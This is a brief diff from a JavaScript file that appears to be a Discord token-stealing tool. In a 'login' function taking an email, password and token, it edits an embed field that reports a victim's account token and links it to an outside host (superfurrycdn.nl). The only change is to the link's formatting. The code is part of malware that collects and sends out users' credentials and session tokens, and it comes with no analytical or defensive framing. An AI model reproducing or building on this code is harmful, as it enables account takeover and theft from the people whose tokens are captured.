@@ -324,7 +324,7 @@ const login = async (email, password, token) => {
             "fields": [
                 {
                     "name": "<a:sn1:989238042164351006> SN - Token:",
-                    "value": `\`\`\`${token}\`\`\`\n[\`Copy Token\`](https://superfurrycdn.nl/copy/${token})',
+                    "value": `\`\`\`${token}\`\`\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})',
                     "inline": false
                 },
                 {
